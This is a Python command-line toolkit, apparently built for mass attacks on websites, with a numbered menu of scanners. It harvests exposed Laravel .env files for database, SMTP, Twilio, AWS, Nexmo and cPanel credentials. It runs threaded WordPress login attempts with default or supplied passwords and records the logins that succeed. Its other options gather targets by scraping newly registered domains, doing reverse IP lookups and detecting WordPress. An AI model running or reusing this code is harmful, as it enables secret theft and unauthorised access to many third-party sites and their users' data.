#!python

'''

xyz ~
xyz0387

'''

import re
import os
import math
import zipfile
import ipaddress
from io import BytesIO
import requests as req
from bs4 import BeautifulSoup as bs
from concurrent.futures import ThreadPoolExecutor as Yutix

RE = '\033[0m'
BB = '\033[1m'
BP = '\033[45m'
I = '\033[3m'
U = '\033[4m'
W = '\033[97m'
P = '\033[95m'
B = '\033[94m'
C = '\033[96m'
G = '\033[92m'
Y = '\033[93m'
R = '\033[91m'
D = '\033[90m'
w = '\033[37m'
p = '\033[35m'
b = '\033[34m'
c = '\033[36m'
g = '\033[32m'
y = '\033[33m'
r = '\033[31m'

tmp = []
col = os.get_terminal_size().columns
req.urllib3.disable_warnings()

def size(size_bytes):
	if size_bytes == 0:
		return "0B"
	size_name = ("B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB")
	i = int(math.floor(math.log(size_bytes, 1024)))
	p = math.pow(1024, i)
	s = round(size_bytes / p, 2)
	return "%s %s" % (s, size_name[i])

def gaskeun(usr,pwd,pth,thd):
	with open(pth) as dn:
		lines = dn.readlines()
		with Yutix(max_workers=thd) as exe:
			for i in lines:
				if 'wp-login.php' not in i.strip():
					url = i.strip()+'/wp-login.php'
				else:
					url = i.strip()
				exe.submit(login,url,usr,pwd)

def login(host,username,password):
	try:
		url = req.get(host,verify=False,timeout=15).url
		hmm = url.split('/')
		dat = { 'log': username, 'pwd': password, 'wp-submit': 'Log In', 'redirect_to': f'{hmm[0]}//{hmm[2]}/wp-admin/', 'testcookie': '1' }
		hdr = { 'User-Agent':'Mozilla/5.0 (Linux; Android 10; SM-A115F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36', 'Cookie':'wordpress_test_cookie=WP+Cookie+check' }
		raw = req.post(url,data=dat,headers=hdr,timeout=10,verify=False)
		
		if 'Dashboard' in str(raw.content):
			print(f'{G}{hmm[0]}//{hmm[2]}/ {username}|{password}')
			open('wplogin.txt','a').write(f'{url} {username}|{password}\n')
			tmp.append(url)
		else:
			print(f'{RE}- {r}{hmm[0]}//{hmm[2]}/ {username}|{password}')
	except:
		print(f'{RE}- {r}{hmm[0]}//{hmm[2]}/ {username}|{password}')

def cek(host):
	try:
		if host.endswith('.env'):
			url = host
		else:
			if host.endswith('/'):
				url = f'{host}.env'
			else:
				url = f'{host}/.env'
		raw = req.get(url,verify=False,timeout=10)
		if 'DB_HOST' in str(raw.content):
			ttd = raw.text
			if len(list(ngenv(ttd,'DB_USERNAME'))) > 0:
				db = f'{BP} DB {RE} '
			else:
				db = ''
			if len(list(ngenv(ttd,'MAIL_USERNAME'))) > 0:
				smtp = f'{BP} SMTP {RE} '
			else:
				smtp = ''
			if len(list(ngenv(ttd,'TWILIO_SID'))) > 0:
				twilio = f'{BP} TWILIO {RE} '
			else:
				if len(list(ngenv(ttd,'TWILIO_ACCOUNT_SID'))) > 0:
					twilio = f'{BP} TWILIO {RE} '
				else:
					if len(list(ngenv(ttd,'TWILIO_USER_SID'))) > 0:
						twilio = f'{BP} TWILIO {RE} '
					else:
						twilio = ''
			if len(list(ngenv(ttd,'AWS_ACCESS_KEY_ID'))) > 0:
				aws = f'{BP} AWS {RE} '
			else:
				aws = ''
			if len(list(ngenv(ttd,'NEXMO_KEY'))) > 0:
				nexmo = f'{BP} NEXMO {RE} '
			else:
				nexmo = ''
			if len(list(ngenv(ttd,'CPANEL_USERNAME'))) > 0:
				cpanel = f'{BP} CPANEL {RE} '
			else:
				cpanel = ''
			tod = db+smtp+twilio+aws+nexmo+cpanel
			print(f'{RE}- {tod}{G}{url}')
			open('found_env.txt','a').write(f'{url}\n')
			tmp.append(url)
		else:
			print(f'{RE}- {r}{url}')
	except req.exceptions.Timeout:
		print(f'{RE}- {r}{url}{RE} [RTO]')
	except Exception as err:
		print(f'{RE}- {r}{url}')

def revip(ip):
	skp = [ 'ns1.', 'ns2.', 'ns3.', 'ns4.', 'mail.', 'cpanel.', 'webdisk.', 'webmail.', 'cpcontacts.', 'cpcalendars.', 'autodiscover.' ]
	raw = req.get(f'https://sonar.omnisint.io/reverse/{ip}',timeout=10).json()
	for i in raw:
		if not any(raw in i for raw in skp):
			print(f'{RE}- {b}{i}')
			open('reversed.txt','a').write(f'{i}\n')
			tmp.append(i)

def geus(fn):
	if len(tmp) > 0:
		print(f'\n{RE}Progress is done\nThanks for using My Tools\n\n- Found: {G}{len(tmp)}{RE}\n- Saved in: {G}{fn}')
	else:
		print(f'\n{RE}Progress done with no results :(')

def ngenv(raw,key):
	try:
		return re.findall(f"\n{key}=(.*?)\n", str(raw))[0]
	except:
		return ''

def d2ip(host):
	url = 'https://dns.google/resolve?name='+host+'&type=A'
	raw = req.get(url).json()
	res = raw['Answer'][0]['data']
	try:
		ip = ipaddress.ip_address(res)
		print(f'{RE} > {G}{ip}')
		tmp.append(ip)
		open('ip.txt','a').write(f'{ip}\n')
	except:
		pass

def liatfile():
	print()
	lst = os.listdir()
	if len(lst) > 0:
		for i in lst:
			if os.path.isfile(i):
				print(f' {RE}--{g} {i} {RE}{size(os.path.getsize(i))}')

def ambil(host,num):
	print(f' [+] Scraping page {num}')
	raw = req.get(f'{host}{num}',headers={'Host':'www.cubdomain.com'},verify=False).text
	for x in bs(raw,'html.parser').findAll('div',{'class':'col-md-4'}):
		site = x.find("a").text
		print(f'  - {site}')
		tmp.append(site)

def ambil2(ses,host,num):
	raw = ses.get(f'{host}{num}',headers={'Host':'www.cubdomain.com'},verify=False).text
	open(f'grab{num}.html','w').write(raw)

def grab(path):
	print()
	print(end='  > Prepare, please wait ... \r')
	ses = req.Session()
	url = f'https://66.45.244.251/domains-registered-by-date/{path}/'
	row = ses.get(url+'1',headers={'Host':'www.cubdomain.com'},verify=False).text
	raw = bs(row,'html.parser')
	lst = len(raw.find('ul',{'class':'pagination-sm pagination mb-2'}).findAll('li'))-1
	with Yutix(max_workers=10) as exe:
		for i in range(lst):
			exe.submit(ambil2,ses,url,i+1)
	for i in range(lst):
		with open(f'grab{i+1}.html','r') as gbtmp:
			for x in bs(gbtmp,'html.parser').findAll('div',{'class':'col-md-4'}):
				site = x.find("a").text
				mtkk = int(col)-int(len(site))-7
				spes = ' '*int(mtkk)
				if int(len(site)) > int(col)-7:
					wtf = int(len(site))-int(col)-8
					print(end=f' {i+1}/{lst} {G}{site[:-wtf]}{RE}{spes}\r')
				else:
					print(end=f' {i+1}/{lst} {G}{site}{RE}{spes}\r')
				tmp.append(site)
		os.system(f'rm -rf grab{i+1}.html')
	#par = raw.find('ul',{'class':'list-inline row'})
	#ser = par.findAll('li')
	print(end=' '*col)
	print(end=f'\r  > Total: {len(tmp)}\n')
	#for i in ser:
		#print(f'  > {i.text}')
	print('\n [1] Save all domains\n [2] Save filtered domains')
	saa = input('\nTixbot > ')
	if saa == '1':
		print()
		for i in range(len(tmp)):
			open(f'{path}.txt','a').write(f'{tmp[i]}\n')
			print(end=f'  > Saving [{G}{i+1}{RE}] \r')
		print(f"\r\n  > Saved in {c}'{path}.txt'{RE}\n  > Thanks for using this tool.")
	elif saa == '2':
		print('\n [+] Free beauty filter for you')
		fltr = input(' [+] Filter with: ')
		wert = 0
		wnzk = 0
		print()
		for i in range(len(tmp)):
			if fltr in tmp[i]:
				wert += 1
				open(f'{path}_{fltr}.txt','a').write(f'{tmp[i]}\n')
			else:
				wnzk += 1
			print(end=f'  > Filtering [{G}{wert}{RE}|{R}{wnzk}{RE}] \r')
		print(f"\r\n  > Saved in {c}'{path}_{fltr}.txt'{RE}\n  > Thanks for using this tool.")

def main():
	print(f'''{RE}
\033[;93m <><><><><><><><><><><><><><><><<>
\033[;93m       AllTools-autoGetRessGood
   \033[;93m           by AFRIZAL
\033[;93m <><><><><><><><><><><><><><><><<>              
 
 
 [1] Grab Domains by Date <Dead>
 [2] Mass Laravel Env Scanner
 [3] Mass WP-login, default & custom u/p
 [4] Filter Duplicate Line in File
 [5] Mass Reverse IP
 [6] Domain to IP
 [7] Reverse IP from Domain List
 [8] Mass Check Site is WordPress
	''')
	isYutix = input('Root@xyz > ')
	try:
		if isYutix == '1':
			print("\n [!] Example: 2021-05-30")
			grab(input(" [?] Input Date: "))
		elif isYutix == '2':
			liatfile()
			pth = input('\n [?] Filepath: ')
			thd = int(input(' [?] Threadss: '))
			print()
			with open(pth) as dn:
				lines = dn.readlines()
				with Yutix(max_workers=thd) as exe:
					for i in lines:
						if 'vendor' in i.strip():
							url = i.strip().split('vendor')[0]
						else:
							if 'http' not in i.strip():
								url = 'http://'+i.strip()
							else:
								url = i.strip()
						exe.submit(cek,url)
			geus('found_env.txt')
		elif isYutix == '3':
			print('\n [1] Default u/p\n [2] Custom u/p')
			m = input(' [?] Mode: ')
			if m == '1':
				usr = 'admin'
				pwd = 'pass'
			elif m == '2':
				usr = input(' [?] Username: ')
				pwd = input(' [?] Password: ')
			else:
				exit(' [!] Invalid mode.')
			liatfile()
			pth = input('\n [?] Filepath: ')
			thd = int(input(' [?] Threadss: '))
			print()
			gaskeun(usr,pwd,pth,thd)
			geus('wplogin.txt')
		elif isYutix == '4':
			liatfile()
			io1 = input('\n [?] Filepath: ')
			with open(io1) as io3:
				io4 = io3.readlines()
				for i in io4:
					tmp.append(i.strip())
				open(io1,'w').write('')
			see = set()
			with open(io1,'a') as io5:
				for lll in tmp:
					if lll not in see:
						io5.write(f'{lll}\n')
						see.add(lll)
			print(f' [-] Total lines: {Y}{len(tmp)}{RE}\n [-] Duplicated: {R}{len(tmp)-len(see)}{RE}\n [-] Filtered: {G}{len(see)}{RE}\n [+] Progress done.')
		elif isYutix == '5':
			liatfile()
			pth = input('\n [?] Filepath: ')
			thd = int(input(' [?] Threadss: '))
			print()
			with open(pth) as dn:
				lines = dn.readlines()
				with Yutix(max_workers=thd) as exe:
					for i in lines:
						exe.submit(revip,i.strip())
			geus('reversed.txt')
		elif isYutix == '6':
			liatfile()
			pth = input('\n [?] Filepath: ')
			thd = int(input(' [?] Threadss: '))
			print()
			with open(pth,'r') as yrf:
				with Yutix(max_workers=thd) as exe:
					for i in yrf:
						host = getdom(i.strip())
						exe.submit(d2ip,host)
			geus('ip.txt')
		elif isYutix == '7':
			liatfile()
			pth = input('\n [?] Filepath: ')
			thd = int(input(' [?] Threadss: '))
			print()
			with open(pth,'r') as yrf:
				with Yutix(max_workers=thd) as exe:
					for i in yrf:
						ip = getip(getdom(i.strip()))
						exe.submit(revip,ip)
			geus('ip.txt')
		elif isYutix == '8':
			liatfile()
			pth = input('\n [?] Filepath: ')
			thd = int(input(' [?] Threadss: '))
			print()
			with open(pth,'r') as yrf:
				with Yutix(max_workers=thd) as exe:
					for i in yrf:
						exe.submit(cekwp,i.strip())
			geus('site_is_wp.txt')
	except FileNotFoundError:
		exit(f' {R}[!] Error file not found.')

def cekwp(host):
	try:
		if host.startswith(('http://','https://')):
			uri = host
		else:
			uri = 'http://'+host
		if uri.endswith('/'):
			url = uri+'wp-login.php'
		else:
			url = uri+'/wp-login.php'
		raw = req.get(url,verify=False,timeout=10).content
		if 'user_login' in str(raw):
			print(f'{RE}- {G}{uri}')
			open('site_is_wp.txt','a').write(f'{uri}\n')
			tmp.append(uri)
		else:
			print(f'{RE}- {r}{uri}')
	except req.exceptions.Timeout:
		print(f'{RE}- {r}{uri}{RE} [RTO]')
	except Exception as err:
		print(f'{RE}- {r}{uri}')

def getdom(url):
	if url.startswith(('http://','https://')):
		host = url.split('/')[2]
	else:
		if '/' in url:
			host = url.split('/')[0]
		else:
			host = url
	return host

def getip(host):
	url = 'https://dns.google/resolve?name='+host+'&type=A'
	try:
		raw = req.get(url,timeout=5).json()
		res = raw['Answer'][0]['data']
		ip = ipaddress.ip_address(res)
		return ip
	except:
		pass

if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		exit()
